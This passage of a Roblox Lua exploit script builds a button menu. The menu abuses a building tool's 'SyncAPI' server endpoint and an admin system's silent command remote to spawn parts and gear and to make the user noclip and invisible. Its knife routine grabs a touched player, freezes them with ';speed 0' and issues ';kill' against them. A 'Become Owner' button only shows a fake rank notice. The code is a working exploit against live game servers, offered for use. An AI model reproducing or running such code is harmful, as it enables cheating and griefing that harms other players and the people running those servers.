						"Remove",
	
						{
	
							knfe.Handle.SpecialMesh
	
						}
	
					}
	
					_(args)
	
				end
	
				local function Resize(part, size, ha)
	
					local args = {
	
						"SyncResize",
	
						{
	
							{
	
								Part = part,
	
								CFrame = ha,
	
								Size = size
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				local function SetAnchor(boolean, part)
	
					local args = {
	
						"SyncAnchor",
	
						{
	
							{
	
								Part = part,
	
								Anchored = boolean
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function MovePart(part, cf)
	
					local args = {
	
						[1] = "SyncMove",
	
						[2] = {
	
							[1] = {
	
								["Part"] = part,
	
								["CFrame"] = cf
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				local function Color(part, color)
	
					local args = {
	
						"SyncColor",
	
						{
	
							{
	
								Part = part,
	
								Color = color,
	
								UnionColoring = false
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function AddMesh(part)
	
					local args = {
	
						[1] = "CreateMeshes",
	
						[2] = {
	
							[1] = {
	
								["Part"] = part
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function DestroyPart(part)
	
					local args = {
	
						[1] = "Remove",
	
						[2] = {
	
							[1] = part
	
						}
	
					}
	
					_(args)
	
				end
	
				function SetMesh(part,meshid,offseter)
	
					local args = {
	
						[1] = "SyncMesh",
	
						[2] = {
	
							[1] = {
	
								["Offset"] = offseter,
	
								["Part"] = part,
	
								["MeshId"] = "rbxassetid://"..meshid
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function SetTexture(part, texid)
	
					local args = {
	
						[1] = "SyncMesh",
	
						[2] = {
	
							[1] = {
	
								["Part"] = part,
	
								["TextureId"] = "rbxassetid://" .. texid
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				function SetTrans(part,int)
	
					local args = {
	
						[1] = "SyncMaterial",
	
						[2] = {
	
							[1] = {
	
								["Part"] = part,
	
								["Transparency"] = int
	
							}
	
						}
	
					}
	
					_(args)
	
				end
	
				spawn(function()
	
					yerpp(knfe.Handle)
	
				end)
	
				spawn(function()
	
					AddMesh(knfe.Handle)
	
				end)
	
				spawn(function()
	
					SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
	
				end)
	
				spawn(function()
	
					SetTexture(knfe.Handle, "80617091791234")
	
				end)
	
				function bleed(target)
	
					if not target or not target.Character then return end
	
	
	
					local stopBleeding = false
	
					local activeBloodParts = {} 
	
					local characterConnection
	
					characterConnection = target.CharacterAdded:Connect(function()
	
						stopBleeding = true
	
						for _, blood in pairs(activeBloodParts) do
	
							if blood and blood.Parent then
	
								DestroyPart(blood)
	
							end
	
						end
	
						if characterConnection then
	
							characterConnection:Disconnect()
	
						end
	
					end)
	
	
	
					coroutine.wrap(function()
	
						while not stopBleeding and target and target.Character do
	
							local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
	
							local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
	
	
	
							if rootPart then
	
								coroutine.wrap(function()
	
									yez=CFrame.new(0,-10,0)
	
									local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
	
									if blood then
	
										table.insert(activeBloodParts, blood)
	
	
	
										spawn(function()
	
											Color(blood, Color3.fromRGB(100, 0, 0))
	
										end)
	
	
	
										spawn(function()
	
											Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
	
										end)
	
										spawn(function()
	
											SetAnchor(false, blood)
	
										end)
	
										coroutine.wrap(function()
	
											wait(2)
	
											Resize(blood, Vector3.new(3, 0.1, 3),blood.CFrame)
	
											Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
	
											SetTrans(blood, 0.9)
	
											SetTrans(blood, 0.7)
	
											SetTrans(blood, 0.5)
	
											SetTrans(blood, 0.3)
	
											SetTrans(blood, 0.1)
	
											DestroyPart(blood)
	
	
	
	
	
											for i, v in pairs(activeBloodParts) do
	
												if v == blood then
	
													table.remove(activeBloodParts, i)
	
													break
	
												end
	
											end
	
										end)()
	
									end
	
								end)()
	
							end
	
	
	
							wait(0.005)
	
						end
	
					end)()
	
				end
	
				function c0lefect(E)
	
					local argsCreate = {
	
						[1] = "CreateDecorations",
	
						[2] = {
	
							[1] = {
	
								["Part"] = E,
	
								["DecorationType"] = "Sparkles"
	
							}
	
						}
	
					}
	
	
	
					local argsSync = {
	
						[1] = "SyncDecorate",
	
						[2] = {
	
							[1] = {
	
								["Part"] = E,
	
								["DecorationType"] = "Sparkles",
	
								["SparkleColor"] = Color3.fromRGB(255, 255, 0)
	
							} 
	
						} 
	
					}
	
					local args = {
	
						"Remove",
	
						{
	
							E:FindFirstChild('Sparkles')
	
						}
	
					}
	
					_(argsCreate)
	
					_(argsSync)
	
					task.wait(1)
	
					_(args)
	
				end
	
				function Weld(part1, part2,lead)
	
					local args = {
	
						[1] = "CreateWelds",
	
						[2] = {
	
							[1] = part1,
	
							[2] = part2
	
						},
	
						[3] = lead
	
					}
	
					_(args)
	
	
	
				end
	
				function breakWelds(part)
	
					local welds = {}
	
					for _, weld in ipairs(part:GetDescendants()) do
	
						if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
	
							table.insert(welds, weld)
	
						end
	
					end
	
					if #welds == 0 then
	
						return false
	
					end
	
					local args = {
	
						"RemoveWelds",
	
						welds
	
					}
	
					_(args)
	
					return true
	
				end
	
				local humanoid = character:FindFirstChildOfClass("Humanoid")
	
				local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
	
				local holdAnimation = Instance.new("Animation")
	
				holdAnimation.AnimationId = "rbxassetid://48146273"
	
				local holdTrack = humanoid:LoadAnimation(holdAnimation)
	
				local killAnimation = Instance.new("Animation")
	
				killAnimation.AnimationId = "rbxassetid://48146273"
	
				local killTrack = humanoid:LoadAnimation(killAnimation)
	
				local knifeHoldAnim = Instance.new("Animation")
	
				knifeHoldAnim.AnimationId = "rbxassetid://299225058"
	
				local staffupAnim = Instance.new("Animation")
	
				staffupAnim.AnimationId = "rbxassetid://27432691"
	
				local swordhitAnim = Instance.new("Animation")
	
				swordhitAnim.AnimationId = "rbxassetid://27432686"
	
				local holdstaffAnim = Instance.new("Animation")
	
				holdstaffAnim.AnimationId = "rbxassetid://57794492"
	
				local stabAnim = Instance.new("Animation")
	
				stabAnim.AnimationId = "rbxassetid://30174375"
	
				local track1 = humanoid:LoadAnimation(staffupAnim)
	
				local track2 = humanoid:LoadAnimation(swordhitAnim)
	
				holdTrack = humanoid:LoadAnimation(holdstaffAnim)
	
				function GrabAnim()
	
					track1.Looped = false
	
					track2.Looped = false
	
					holdTrack.Looped = false
	
					track1:Play()
	
					track1.Stopped:Wait()
	
					track2:Play()
	
					track2.Stopped:Wait()
	
					holdTrack:Play()
	
					holdTrack:AdjustSpeed(0)
	
				end
	
				function Kill()
	
					local stabTrack = humanoid:LoadAnimation(stabAnim)
	
					stabTrack.Looped = false
	
					stabTrack:Play()
	
					stabTrack.Stopped:Wait()
	
					if holdTrack then holdTrack:Stop() end
	
				end
	
				function failed()
	
					track1.Looped = false
	
					track2.Looped = false
	
					holdTrack.Looped = false
	
					track1:Play()
	
					track1:AdjustSpeed(3)
	
					track1.Stopped:Wait()
	
	
	
					holdTrack:Play()
	
					wait(0.3)
	
					holdTrack:Stop()
	
				end
	
				local isBusy = false
	
				local alignPosition
	
				local alignOrientation
	
				local Players = game:GetService("Players")
	
				local player = Players.LocalPlayer 
	
				local function attachBehind(targetChar)
	
					local root = character:FindFirstChild("HumanoidRootPart")
	
					local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	
					if root and targetRoot then
	
	
	
						local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
	
						local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
	
	
	
						alignPosition = Instance.new("AlignPosition")
	
						alignPosition.MaxForce = 1000000
	
						alignPosition.Responsiveness = 200
	
						alignPosition.Attachment0 = attachment0
	
						alignPosition.Attachment1 = attachment1
	
						alignPosition.Parent = root
	
						alignOrientation = Instance.new("AlignOrientation")
	
						alignOrientation.MaxTorque = 1000000
	
						alignOrientation.Responsiveness = 200
	
						alignOrientation.Attachment0 = attachment0
	
						alignOrientation.Attachment1 = attachment1
	
						alignOrientation.Parent = root
	
	
	
						attachment1.Position = Vector3.new(0, 0, 0.4)
	
					end
	
				end
	
				local function detach()
	
					if alignPosition then
	
						alignPosition:Destroy()
	
						alignPosition = nil
	
					end
	
					if alignOrientation then
	
						alignOrientation:Destroy()
	
						alignOrientation = nil
	
					end
	
				end
	
				local function attacke()
	
					if isBusy then return end
	
					isBusy = true
	
					local hitPlayer = nil
	
					local touchedConnection
	
					local function onTouch(other)
	
						local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
	
						if otherPlayer and otherPlayer ~= player then
	
							hitPlayer = otherPlayer
	
						end
	
					end
	
					touchedConnection = arm.Touched:Connect(onTouch)
	
					task.wait(0.15)
	
					if touchedConnection then
	
						touchedConnection:Disconnect()
	
					end
	
					if hitPlayer and hitPlayer.Character then
	
	
	
						RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
	
	
	
	
	
						track1.Looped = false
	
						track2.Looped = false
	
						holdTrack.Looped = false
	
						track1:Play()
	
						track1.Stopped:Wait()
	
						track2:Play()
	
						track2:AdjustSpeed(3)
	
						track2.Stopped:Wait()
	
						holdTrack:Play()
	
	
	
						holdTrack:AdjustSpeed(0)
	
						spawn(function()
	
							attachBehind(hitPlayer.Character)
	
							wait(0.8)
	
							detach()
	
						end)
	
						spawn(function()
	
							SetLocked(hitPlayer.Character.Torso, false)
	
						end)
	
						spawn(function()
	
							SetLocked(char.Torso, false)
	
						end)
	
						Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
	
						Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
	
						Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
	
						wait(3)
	
						spawn(function()
	
							Kill()
	
						end)
	
						bleed(hitPlayer)
	
						wait(0.45)
	
						RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
	
						wait(0.5)
	
						breakWelds(character.Torso)
	
						breakWelds(hitPlayer.Character.Torso)
	
						spawn(function()
	
							wait(0.8)
	
							spawn(function()
	
								SetLocked(hitPlayer.Character.Torso, false)
	
							end)
	
							spawn(function()
	
								SetLocked(hitPlayer.Character["Right Arm"], false)
	
							end)
	
							spawn(function()
	
								SetLocked(hitPlayer.Character["Left Arm"], false)
	
							end)
	
							spawn(function()
	
								SetLocked(hitPlayer.Character["Right Leg"], false)
	
							end)
	
							spawn(function()
	
								SetLocked(hitPlayer.Character["Left Leg"], false)
	
							end)
	
							spawn(function()
	
								SetCollision(hitPlayer.Character.Torso, true)
	
							end)
	
							spawn(function()
	
								SetCollision(hitPlayer.Character["Right Arm"], true)
	
							end)
	
							spawn(function()
	
								SetCollision(hitPlayer.Character["Left Arm"], true)
	
							end)
	
							spawn(function()
	
								SetCollision(hitPlayer.Character["Right Leg"], true)
	
							end)
	
							spawn(function()
	
								SetCollision(hitPlayer.Character["Left Leg"], true)
	
							end)
	
						end)
	
						wait(0.3)
	
	
	
	
	
						isBusy = false
	
	
	
					else
	
	
	
						failed()
	
						wait(0.4)
	
						isBusy = false
	
					end
	
				end
	
				local args = {
	
					"Remove",
	
					{
	
						knfe.Handle
	
					}
	
				}
	
				_(args)
	
				knfe:Destroy()
	
				RequestCommand:InvokeServer(";hat me 18420472059")
	
				task.wait(1)
	
				local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
	
				spawn(function()
	
					local args = {
	
						"Remove",
	
						{
	
							knife.Handle.SpecialMesh
	
						}
	
					}
	
					_(args)
	
				end)
	
				spawn(function()
	
					AddMesh(knife.Handle)
	
				end)
	
				spawn(function()
	
					SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0.50,-0.25))
	
				end)
	
				spawn(function()
	
					SetTexture(knife.Handle, "80617091791234")
	
				end)
	
				ready = true
	
				UserInputService.mouse2click:Connect(function(input, gameProcessed)
	
					if gameProcessed then return end
	
					if ready == true then
	
						attacke()
	
					end
	
				end)
	
			end
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Plane"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Plane"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";noclip2 me ;invisible me ")
			RequestCommand:InvokeServer(";noclip me ;invisible me ")
	
			local tool
	
			-- หา SyncAPI Tool
			for i,v in pairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
			local function _(args)
				remote:InvokeServer(unpack(args))
			end
	
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
	
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
	
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
	
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
	
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
	
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
			end
	
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
	
			-- ฟังก์ชันหลัก ปรับตัวละคร
			function Thomas(player)
				-- ลบ hats/accessories ทั้งในตัวละคร
				for _, accessory in ipairs(char:GetChildren()) do
					if accessory:IsA("Accessory") then
						accessory:Destroy()
					end
				end
	
				-- ลบ hats/accessories ใน Backpack
				for _, item in ipairs(player.Backpack:GetChildren()) do
					if item:IsA("Accessory") then
						item:Destroy()
					end
				end
	
				-- สร้าง Part ใหม่
				SetAnchor(true,char.HumanoidRootPart)
				CreatePart(char.HumanoidRootPart.CFrame,char)
				local myPart = char.Part
				SetCollision(myPart,false)
				SetLocked(myPart,false)
				Resize(myPart,Vector3.new(5,5,10),char.HumanoidRootPart.CFrame)
				SetLocked(char.HumanoidRootPart,false)
				Weld(myPart,char.HumanoidRootPart,myPart)
				SetAnchor(false,myPart)
				AddMesh(myPart)
				MeshResize(myPart,Vector3.new(0.3,0.3,0.3))
	
				-- ตั้ง MeshId
				local meshId = "1196888680"
				local argsMesh = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = myPart,
							["MeshId"] = "rbxassetid://"..meshId
						}
					}
				}
				remote:InvokeServer(unpack(argsMesh))
	
				char.Humanoid.WalkSpeed = 0
	
				-- RenderStepped ปรับ CanCollide และ WalkSpeed
				game:GetService("RunService").RenderStepped:Connect(function()
					for i,v in char:GetDescendants() do
						if v:IsA("BasePart") then
							v.CanCollide = false
						end
					end
					char.Humanoid.WalkSpeed = 0
				end)
			end
	
			Thomas(player)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Lance"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Lance"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 1363011928")
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Lightsaber"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Lightsaber"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";gear me 1208300505")
	
	
	
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Master Hand"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			local sc = remote
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
	
	
				task.wait(0.1)
				for _, obj in ipairs(parent:GetChildren()) do
					if obj:IsA("BasePart") and (obj.Position - cf.Position).Magnitude < 1 then
						return obj
					end
				end
			end
	
	
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = part
					},
					[3] = stringg
				}
	
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTransparency(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function reflect(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Reflectance"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color --[[Color3]],
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
	
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
	
	
	
	
	
	
			local head = player.Character and player.Character:FindFirstChild("Head")
			head.Anchored = true
			local targetCFrame = head.CFrame + Vector3.new(0, 20, 0)
			local Cloud = CreatePart(targetCFrame, workspace)
			SetLocked(Cloud, true)
			SetCollision(Cloud, false)
			Color(Cloud, Color3.fromRGB(163, 162, 164))
			AddMesh(Cloud)
			SetMesh(Cloud, "465982742")
			MeshResize(Cloud, Vector3.new(0.01, 0.01, 0.01))
			reflect(Cloud, 0.5)
			Weld(Cloud, char.HumanoidRootPart, char.HumanoidRootPart)
			SetAnchor(false, Cloud)
			head.Anchored = false
	
			local function rainFromCloud()
				while true do
					wait(0.1) 
					if Cloud and Cloud.Parent then
						local basePos = Cloud.Position
						local offsetX = math.random(-3, 3) 
						local offsetZ = math.random(-3, 3)
	
	
						local spawnCFrame = CFrame.new(
							basePos.X + offsetX,
							basePos.Y - 2, 
							basePos.Z + offsetZ
						)
	
						spawn(function()
							local lol = CFrame.new(0,0,0)
							local newPart = remote:InvokeServer("CreatePart","Normal",lol,Cloud)
							if not newPart then return end
	
							spawn(function()
								SetName(newPart, " ")
							end)
							spawn(function()
								SetCollision(newPart, false)
							end)
							spawn(function()
								SetAnchor(false, newPart)
							end)
	
							spawn(function()
								Resize(newPart, Vector3.new(2, 2, 0.000001), spawnCFrame) 
							end)
	
							spawn(function()
								SpawnDecal(newPart, Enum.NormalId.Front)
							end)
							spawn(function()
								AddDecal(newPart, "0", Enum.NormalId.Front)
							end)
							spawn(function()
								SpawnDecal(newPart, Enum.NormalId.Back)
							end)
							spawn(function()
								AddDecal(newPart, "0", Enum.NormalId.Back)
							end)
							spawn(function()
	
								local randomAngle = math.random(0, 1) == 0 and math.rad(-30) or math.rad(30)
								MovePart(newPart, spawnCFrame * CFrame.Angles(0, 0, randomAngle))
							end)
							spawn(function()
								SetTransparency(newPart, 1) 
							end)
						end)
					end
					wait(0.05)
				end
			end
	
	
			coroutine.wrap(rainFromCloud)()
		end)
	
	
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Snowball"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 19328185")
	
		end)
	
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Staff"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Staff"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 47262951")
	
		end)
	
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Techno Gauntlet"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.48,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Techno Gauntlet"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 1363010936")
	
		end)
	
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "xBow"
		button.Position = UDim2.new(0.5,3,0,231)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "xBow"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 2136389582")
	
		end)
	
		local button = Instance.new("TextButton")
		button.Parent = ws
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Wand"
		button.Position = UDim2.new(0,0,0,231)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Wand"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";gear me 154727343")
	
		end)
	
		local title = Instance.new("TextLabel")
		title.Parent = gt
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Gear/Tools"
		title.TextColor3 = whit
		local title = Instance.new("TextLabel")
		title.Parent = ws
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Size = UDim2.new(1,0,0,30)
		title.ZIndex = 2
		title.Font = "SourceSansBold"
		title.FontSize = "Size14"
		title.Text = "Weapon Scripts"
		title.TextColor3 = whit
		-- Page 2 End --
	
	
	
	
		-- Misc --
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Become Owner in Personal Server"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Become Owner [PS]"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommand:InvokeServer(";Notice me You has been PermRanked To !")
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = misc
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Disco Fog"
		button.Position = UDim2.new(0.5,3,0,33)
